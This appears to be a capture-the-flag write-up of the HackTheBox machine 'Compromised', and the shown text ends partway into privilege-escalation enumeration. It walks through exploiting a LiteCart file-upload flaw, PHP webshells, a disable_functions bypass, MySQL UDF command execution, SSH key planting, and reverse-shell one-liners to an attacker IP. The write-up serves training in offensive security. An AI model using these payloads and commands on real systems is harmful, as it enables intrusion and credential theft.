---
title: HTB: Compromised
url: https://0xdf.gitlab.io/2021/01/23/htb-compromised.html
date: 2021-01-23T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, ctf, htb-compromised, ubuntu, litecart, searchsploit, gobuster, mysql, credentials, php, mysql-udf, upload, webshell, php-disable-functions, phpinfo, strace, pam-backdoor, ldpreload-backdoor, ghidra, ghidra-version-tracking, reverse-engineering, ldpreload, htb-stratosphere
---

![Compromised](https://0xdfimages.gitlab.io/img/compromised-cover.png)

Compromised involves a box that’s already been hacked, and so the challenge is to follow the hacker and both exploit public vulnerabilities as well as make use of backdoors left behind by the hacker. I’ll find a website backup file that shows how the login page was backdoored to record admin credentials to a web accessible file. With those creds, I’ll exploit a vulnerable LiteCart instance, though the public exploit doesn’t work. I’ll troubleshot that to find that the PHP functions typically used for execution are disabled. I’ll show two ways to work around that to get access to the database and execution as the mysql user, who’s shell has been enabled by the hacker. As the mysql user, I’ll find a strace log, likely a makeshift keylogger used by the hacker with creds to pivot to the next user. To get root, I’ll take advantage of either of two backdoors left on the box by the attacker, a PAM backdoor and a LDPRELOAD backdoor. In Beyond Root, I’ll show how to run commands as root using the PAM backdoor from the webshell as www-data.

## Box Info

| Name | [Compromised](https://hackthebox.com/machines/compromised)  [Compromised](https://hackthebox.com/machines/compromised) [Play on HackTheBox](https://hackthebox.com/machines/compromised) |
| --- | --- |
| Release Date | [12 Sep 2020](https://twitter.com/hackthebox_eu/status/1304084258382897152) |
| Retire Date | 23 Jan 2021 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Compromised |
| Radar Graph | Radar chart for Compromised |
| First Blood User | 03:35:20[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 03:34:56[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [D4nch3n D4nch3n](https://app.hackthebox.com/users/103781) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.207
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-16 07:19 EST
Nmap scan report for 10.10.10.207
Host is up (0.045s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.01 seconds
root@kali# nmap -p 22,80 -sC -sV -oA scans/tcpscripts 10.10.10.207
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-16 07:19 EST
Nmap scan report for 10.10.10.207
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Legitimate Rubber Ducks | Online Store
|_Requested resource was http://10.10.10.207/shop/en/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu Bionic 18.04.

### Website - TCP 80

#### Site

The page is a commercial platform selling rubber ducks:

[![image-20210116072121025](https://0xdfimages.gitlab.io/img/image-20210116072121025.png)](https://0xdfimages.gitlab.io/img/image-20210116072121025.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210116072121025.png)

#### Tech Stack

The site has a “LiteCart” logo at the top right. [LiteCart](https://www.litecart.net/en/) is a “e-commerce platform built with PHP, jQuery and HTML 5.” Even without the logo, the HTTP response headers also show LiteCart:

```

HTTP/1.1 200 OK
Date: Sat, 16 Jan 2021 12:25:10 GMT
Server: Apache/2.4.29 (Ubuntu)
X-Powered-By: LiteCart
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: language_code=en; expires=Mon, 15-Feb-2021 12:25:10 GMT; Max-Age=2592000; path=/shop/
Set-Cookie: currency_code=USD; expires=Mon, 15-Feb-2021 12:25:10 GMT; Max-Age=2592000; path=/shop/
Content-Language: en
Vary: Accept-Encoding
Content-Length: 22423
Connection: close
Content-Type: text/html; charset=UTF-8

```

I don’t see a version number anywhere.

There is an exploit for LiteCart in `searchsploit`:

```

root@kali# searchsploit litecart
------------------------------------ ---------------------------------
 Exploit Title                      |  Path
------------------------------------ ---------------------------------
LiteCart 2.1.2 - Arbitrary File Upl | php/webapps/45267.py
------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results

```

It is arbitrary file upload, but taking a quick look at it with `searchsploit -x php/webapps/45267.py`, it requires auth.

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

root@kali# gobuster dir -u http://10.10.10.207 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -o scans/gobuster-root-small-php -t 30
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.207
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/01/16 07:23:55 Starting gobuster
===============================================================
/shop (Status: 301)
/index.php (Status: 302)
/backup (Status: 301)
===============================================================
2021/01/16 07:25:32 Finished
===============================================================

```

#### Backup

`/backup` is directory-listable, serving a single file, `a.tar.gz`:

![image-20210116072744638](https://0xdfimages.gitlab.io/img/image-20210116072744638.png)

The archive contains a backup for the website. The source code shows the root folder contains an interesting file, `.sh.php`:

```

<?php system($_REQUEST['cmd']); ?>

```

This file isn’t on the host anymore, but perhaps was put up there when the box was compromised.

I spent far too long looking for a config file that would contain the password. I found a password for the database in `includes/config.inc.php`:

```

// Database
  define('DB_TYPE', 'mysql');
  define('DB_SERVER', 'localhost');
  define('DB_USERNAME', 'root');
  define('DB_PASSWORD', 'changethis');
  define('DB_DATABASE', 'ecom');
  define('DB_TABLE_PREFIX', 'lc_');
  define('DB_CONNECTION_CHARSET', 'utf8');
  define('DB_PERSISTENT_CONNECTIONS', 'false');

```

The password “changethis” could very well be wrong in this case. It certainly doesn’t work to get into the admin panel.

Eventually some recursive `grep` found this in `shop/admin/login.php`:

```

if (isset($_POST['login'])) {
    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
    user::login($_POST['username'], $_POST['password'], $redirect_url, isset($_POST['remember_me']) ? $_POST['remember_me'] : false);
  }

```

That commented line is interesting. Given the theme of this box is likely that it’s already compromised, maybe the other hacker left that behind to collect creds. That log file is still on the server:

```

root@kali# curl http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt
User: admin Passwd: theNextGenSt0r3!~

```

Logging in at `/shop/admin/login.php` with those creds works:

![image-20210116143434241](https://0xdfimages.gitlab.io/img/image-20210116143434241.png)

At the bottom, it identifies the LiteCart version, 2.1.2, which is the one with the upload vulnerability.

## Shell as mysql

### Exploit

The exploit is a pretty simple upload vulnerability, where a PHP file can be uploaded using the vQmods interface in LiteCart. I’ll log into the admin interface at `/shop/admin` like above, and at the very bottom of the menu on the left is “vQmods”, which leads to this page:

![image-20210119084339587](https://0xdfimages.gitlab.io/img/image-20210119084339587.png)

There’s client-side filtering requiring a file with a `.xml` extension, but I can catch the request in Burp (or use the exploit script to bypass client-side filtering) and change the file name to `.php`, and the file will upload.

### Exploit Troubleshooting

I’ll use the exploit script from here out, but it would be just as easy to do things manually. Running the exploit from `searchsploit` doesn’t completely work, returning an empty line where the output should be:

```

root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~' 
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id

```

The exploit is nice enough to give me the address of the webshell, and visiting it returns an empty page:

```

root@kali# curl -v 'http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id'
*   Trying 10.10.10.207:80...
* Connected to 10.10.10.207 (10.10.10.207) port 80 (#0)
> GET /shop/vqmod/xml/S59WW.php?c=id HTTP/1.1
> Host: 10.10.10.207
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 16 Jan 2021 20:00:20 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 10.10.10.207 left intact

```

So the upload succeeded, but the execution isn’t working. I can check that a different way by modifying the script. It’s this line that sets the payload:

```

files = {
        'vqmod': (rand + ".php", "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); } ?>", "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }

```

I’ll change that to something more benign:

```

files = {
        'vqmod': (rand + ".php", "<?php echo '0xdf was here'; } ?>", "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }

```

It works:

```

root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/XPKU4.php?c=id
0xdf was here

```

`phpinfo()` will provide useful information about the box:

```

files = {
        'vqmod': (rand + ".php", '<?php phpinfo();  ?>', "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }

```

```

root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/DPYLZ.php?c=id
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
...[snip]...

```

I’ll use that address to view the page. In that information, it’s clear why the webshell isn’t working:

[![image-20210116152148808](https://0xdfimages.gitlab.io/img/image-20210116152148808.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210116152148808.png)

These functions are disabled, including `system` that’s used in the exploit.

`disable_functions` can be bypassed pretty easily, but that’s not the intended way to solve this box (I’ll show it in the next section).

### Path #1: Enumeration via PHP

#### Read File / Dir List PHP

I modified the exploit again to upload a PHP file that allows me to get files and directories:

```

sploit = """<?php
if (isset($_REQUEST['file'])) { 
    echo file_get_contents($_REQUEST['file']);
} 

if (isset($_REQUEST['dir'])) {
    print_r(scandir($_REQUEST['dir']));
}

?>
"""
files = {
        'vqmod': (rand + ".php", sploit, "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }

```

After running that, I can list a directory:

```

root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --data-urlencode "dir=/home"
Array
(
    [0] => .
    [1] => ..
    [2] => sysadmin
)

```

This user can’t read in `/home/sysadmin`.

I can also get a file, like `/etc/passwd`:

```

root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --data-urlencode "file=/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...[snip]...
sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
red:x:1001:1001::/home/red:/bin/false

```

#### Database

It’s really interesting to note that in the `/etc/passwd` file, the user mysql has a shell, `/bin/bash`. That’s unusual, as `mysql` typically sets the mysql user’s shell to `/bin/false`. Given the hacked theme of the box, it’s worth looking at this further.

Looking at mysql’s home directory doesn’t return anything, which indicates a permissions issue. I can try to check out the database, especially to see if it can execute. I’ll pull the config file at the same path I noted in the backup. The DB password is still “changethis”:

```

root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --data-urlencode "file=/var/www/html/shop/includes/config.inc.php"
<?php
...[snip]...
// Database
  define('DB_TYPE', 'mysql');
  define('DB_SERVER', 'localhost');
  define('DB_USERNAME', 'root');
  define('DB_PASSWORD', 'changethis');
  define('DB_DATABASE', 'ecom');
  define('DB_TABLE_PREFIX', 'lc_');
  define('DB_CONNECTION_CHARSET', 'utf8');
  define('DB_PERSISTENT_CONNECTIONS', 'false');  
...[snip]...

```

I’ll add some code to my PHP that will run DB queries:

```

sploit = """<?php
if (isset($_REQUEST['file'])) { 
    echo file_get_contents($_REQUEST['file']);
} 

if (isset($_REQUEST['dir'])) {
    print_r(scandir($_REQUEST['dir']));
}

if (isset($_REQUEST['db'])) {
    $conn = new mysqli("localhost", "root", "changethis", "ecom") or die("Connect failed: %s\n". $conn -> error);
    $res = mysqli_query($conn, $_REQUEST['db']);
    while ($row = $res->fetch_row()) {
        foreach ($row as $r) {
            echo $r . " ";
        }
        echo "\n";
    }
}

?>
"""

```

It works:

```

root@kali# curl -s -G 'http://10.10.10.207/shop/admin/../vqmod/xml/NIBI1.php' --data-urlencode 'db=select @@version'
5.7.30-0ubuntu0.18.04.1 

```

#### exec\_cmd

Eventually I checked the `mysql.func` table, which [stores information about user-defined functions](https://mariadb.com/kb/en/mysqlfunc-table) created with the `CREATE FUNCTION UDF` statement. The headers are `Name, Ret, dl, type`:

```

root@kali# curl -s -G 'http://10.10.10.207/shop/admin/../vqmod/xml/NIBI1.php' --data-urlencode 'db=select * from mysql.func;'
exec_cmd 0 libmysql.so function 

```

`exec_cmd` isn’t a standard MySQL function, but rather a user defined function (UDF), perhaps left behind by the attacker. Just knowing the name, it’s worth a shot to run something. Command output doesn’t seem to come back (seems like that’s an issue with my shell, as `exec_cmd` does return data, as I’ll show in the next section), but it does seem to run, as running `ping -c 5` takes about five seconds to return.

#### Shell

Just like with the webshell, nothing that sends traffic back to my host seems to work. But I can guess that since the user had a shell added, perhaps there’s a `.ssh` directory. And it works:

```

root@kali# curl -s -G 'http://10.10.10.207/shop/admin/../vqmod/xml/NIBI1.php' --data-urlencode "db=SELECT exec_cmd('echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing\" >> /var/lib/mysql/.ssh/authorized_keys');"
root@kali# ssh -i ~/keys/ed25519_gen mysql@10.10.10.207
The authenticity of host '10.10.10.207 (10.10.10.207)' can't be established.
ECDSA key fingerprint is SHA256:eYvjeWOH3lYrex1T0a/7BQsAv9L4YbZem1T0BGWjtVE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.207' (ECDSA) to the list of known hosts.
Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.4
mysql@compromised:~$

```

### Path #2: Bypass disable\_functions

#### POC

I [wrote](/2019/08/02/bypassing-php-disable_functions-with-chankro.html) about [Chankro](https://github.com/TarlogicSecurity/Chankro) a while back and how it can bypass `disable_functions` in PHP. Unfortunately for this case, it [relies on](https://github.com/TarlogicSecurity/Chankro/blob/7b6e844e18f6812beb18db4b67b246edcec04b84/chankro.py#L70) `putenv` in PHP, which is listed as blocked in the `phpinfo` output. Still, there are other ways to bypass these filters. For example, something like [this](https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass) to get execution. It’s a webshell that goes through a bunch of work-arounds to get execution without using any of the functions that get disabled but rather exploiting a bug in PHP. At the top of the PHP code, it calls `pwn("uname -a");`.

I’ll update the exploit script to read in and send the shell from the GitHub:

```

with open("exploit.php", "r") as f:
    exploit = f.read()

files = {
        'vqmod': (rand + ".php", exploit, "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }

```

On running it, it prints the output of `uname`:

```

root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/PMBX7.php?c=id
Linux compromised 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

```

That’s the output of `uname -a`.

#### Webshell

I’ll replace `uname` with a payload that runs based on the request:

```

#pwn("uname -a");
pwn($_REQUEST['c']);

```

I used `c` because the exploit POC uses `c` in it’s webshell. When I run this, it works:

```

root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php?c=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

#### No Reverse Shell

I wasn’t able to get a full shell from this. It seems that perhaps the firewall is not allowing traffic out? All of these either hung or returned instantly:

```

root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/10.10.14.4/443 0>&1'"
^C
root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php --data-urlencode "c=wget http://10.10.14.4:443"
^C
root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php --data-urlencode "c=nc 10.10.14.4 443"
^C

```

I can pull the `iptables` rules:

```

root@kali# curl -s http://10.10.10.207/shop/vqmod/xml/ASZL5.php --data-urlencode 'c=find /etc/iptables -type f'
/etc/iptables/rules.v4
root@kali# curl -s http://10.10.10.207/shop/vqmod/xml/ASZL5.php --data-urlencode 'c=cat /etc/iptables/rules.v4'
# Generated by iptables-save v1.6.1 on Mon May 11 02:27:29 2020
*filter
:INPUT DROP [6:1032]
:FORWARD DROP [0:0]
:OUTPUT DROP [5:394]
-A INPUT -i lo -j ACCEPT
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 22 -m tcp -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -m tcp -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
-A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 22 -m tcp -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 80 -m tcp -j ACCEPT
COMMIT
# Completed on Mon May 11 02:27:29 2020

```

Inbound only established, 22, and 80 are allowed. Outbound only established and source port 22 and 80 (coming from SSH and HTTP). Anything I’d want to send outbound will be blocked. Still, this webshell is enough to run `mysql` commands through. Alternatively, I could write a forward shell (using Ippsec’s technique like I’ve shown several times, including [Stratosphere](/2018/09/01/htb-stratosphere.html#building-a-shell) - Ippsec will show this in his [Compromised video](https://www.youtube.com/watch?v=yaV09XCDDqI)), or just root from here (see [Beyond Root](#beyond-root---root-from-webshell)).

#### exec\_cmd

I can run the `mysql` binary through this webshell:

```

root@kali# curl -G http://10.10.10.207/shop/admin/../vqmod/xml/7HMS2.php --data-urlencode 'c=mysql -u root -pchangethis -e "SELECT @@version"'
@@version
5.7.30-0ubuntu0.18.04.1

```

The `exec_cmd` function does return output when run this way:

```

root@kali# curl -G http://10.10.10.207/shop/admin/../vqmod/xml/7HMS2.php --data-urlencode 'c=mysql -u root -pchangethis -e "SELECT exec_cmd(\"id\");"'
exec_cmd("id")
uid=111(mysql) gid=113(mysql) groups=113(mysql)\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0

```

For some reason it appends a ton of `\0` to the end. Multi-line output isn’t handled very well (as in most of it doesn’t come through):

```

root@kali# curl -G http://10.10.10.207/shop/admin/../vqmod/xml/7HMS2.php --data-urlencode 'c=mysql -u root -pchangethis -e "SELECT exec_cmd(\"ls /var/lib/mysql\");"'
exec_cmd("ls /var/lib/mysql")
auto.cnf\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0

```

Still, I can write an SSH key just like above.

## Shell as sysadmin

### Enumeration

In mysql’s homedir, there’s a file that jumps out as unusual:

```

mysql@compromised:~$ ls -l
total 189260
-rw-r----- 1 mysql mysql       56 May  8  2020 auto.cnf
-rw------- 1 mysql mysql     1680 May  8  2020 ca-key.pem
-rw-r--r-- 1 mysql mysql     1112 May  8  2020 ca.pem
-rw-r--r-- 1 mysql mysql     1112 May  8  2020 client-cert.pem
-rw------- 1 mysql mysql     1676 May  8  2020 client-key.pem
-rw-r--r-- 1 root  root         0 May  8  2020 debian-5.7.flag
drwxr-x--- 2 mysql mysql    12288 May 28  2020 ecom
-rw-r----- 1 mysql mysql      527 Sep 12 19:53 ib_buffer_pool
-rw-r----- 1 mysql mysql 79691776 Jan 16 12:21 ibdata1
-rw-r----- 1 mysql mysql 50331648 Jan 16 12:21 ib_logfile0
-rw-r----- 1 mysql mysql 50331648 May 27  2020 ib_logfile1
-rw-r----- 1 mysql mysql 12582912 Jan 17 12:00 ibtmp1
drwxr-x--- 2 mysql mysql     4096 May  8  2020 mysql
drwxr-x--- 2 mysql mysql     4096 May  8  2020 performance_schema
-rw------- 1 mysql mysql     1680 May  8  2020 private_key.pem
-rw-r--r-- 1 mysql mysql      452 May  8  2020 public_key.pem
-rw-r--r-- 1 mysql mysql     1112 May  8  2020 server-cert.pem
-rw------- 1 mysql mysql     1680 May  8  2020 server-key.pem
-r--r----- 1 root  mysql   787180 May 13  2020 strace-log.dat
drwxr-x--- 2 mysql mysql    12288 May  8  2020 sys

```

`strace-log.dat` is owned by root, and readable by the mysql group. Every other file in this folder (except the 0-byte `debian-5.7.flag` is owned by mysql.) `strace` is a [program](https://man7.org/linux/man-pages/man1/strace.1.html) designed to intercept and display or log system calls made by another processes. It can also be used by a hacker as a [make-shift keylogger](https://seclists.org/pen-test/2005/Jul/73).

Running a script like [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) will also highlight this file as interesting:

```

[+] Readable files belonging to root and readable by me but not world readable
-r--r----- 1 root mysql 787180 May 13  2020 /var/lib/mysql/strace-log.dat

```

On doing some searching through the file, there’s a place where it’s recording a `mysql` run where the password is passed on the command line:

```

22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0

```

### su

That password works for the user on the box, sysadmin:

```

mysql@compromised:~$ su sysadmin -
Password: 
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
sysadmin@compromised:/var/lib/mysql$ 

```

And I can grab `user.txt`:

```

sysadmin@compromised:~$ cat user.txt
8fa1e68a************************

```

This password also works for SSH:

```

root@kali# sshpass -p '3*NLJE32I$Fe' ssh sysadmin@10.10.10.207
Last login: Wed Jan 20 18:37:38 2021 from 10.10.14.4
sysadmin@compromised:~$

```

## Path #1: Shell as root via pam backdoor

### Enumeration

At this point it’s clear I’m trying to follow in the footsteps of the attacker that already compromised this box. One place to look for persistence is in the `/lib` directory. One trick (thanks to [Ippsec](https://twitter.com/ippsec) for this one) for looking at a system is to print full timestamps, and look at ones that have fractional seconds. `dpkg` (by default) only stores to the second, and thus files with fractional seconds are all modified some other way.

For example, on Compromised, there are almost 13,000 files in `/lib`:

```

sysadmin@compromised:/var/www$ find /lib  -type f | wc -l
12853
sysadmin@compromised:/var/www$ find /lib  -type f -printf "%M %n %-6u %-6g %6s %TY-%Tm-%Td %TT %TZ %h/%f\n" | sort -k 6,7
-rw-r--r-- 1 root   root      188 2014-02-24 18:19:14.0000000000 UTC /lib/systemd/system/rsync.service
-rw-r--r-- 1 root   root   137256 2014-12-21 05:11:09.0000000000 UTC /lib/x86_64-linux-gnu/liblzo2.so.2.0.0
